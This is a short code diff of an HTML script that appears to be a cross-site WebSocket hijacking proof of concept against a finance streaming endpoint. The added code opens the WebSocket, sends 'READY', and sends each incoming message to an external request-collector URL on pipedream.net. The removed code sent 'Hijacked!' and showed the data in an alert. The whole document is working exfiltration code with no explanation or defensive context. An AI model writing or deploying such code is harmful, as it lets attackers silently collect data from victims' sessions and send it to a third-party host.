@@ -1,10 +1,11 @@
 <script>
-var webSocket = new WebSocket('wss://streamer.finance.yahoo.com/');
-webSocket.onmessage = function(event) {
-    alert(event.data);
+websocket = new WebSocket('wss://streamer.finance.yahoo.com')
+websocket.onopen = start
+websocket.onmessage = handleReply
+function start(event) {
+  websocket.send("READY");
 }
-webSocket.onopen = function(event) {
-    webSocket.send('Hijacked!')
+function handleReply(event) {
+  fetch('https://endwwnwdiewq5.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
 }
-
 </script>
